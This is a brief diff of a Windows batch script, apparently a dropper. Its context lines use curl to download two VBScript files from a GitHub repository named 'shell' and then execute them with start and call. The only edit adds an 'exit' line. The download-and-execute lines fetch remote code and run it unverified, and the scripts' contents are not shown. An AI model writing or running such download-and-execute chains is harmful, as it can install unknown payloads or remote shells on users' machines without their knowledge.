@@ -6,4 +6,4 @@ curl https://raw.githubusercontent.com/0x2034/shell/main/vb.vbs -o D:\vb.vbs
 curl https://raw.githubusercontent.com/0x2034/shell/main/vb1.vbs -o "%downloads_dir%\vb1.vbs"
 start /wait D:\vb.vbs
 call "%downloads_dir%\vb1.vbs"
-
+exit
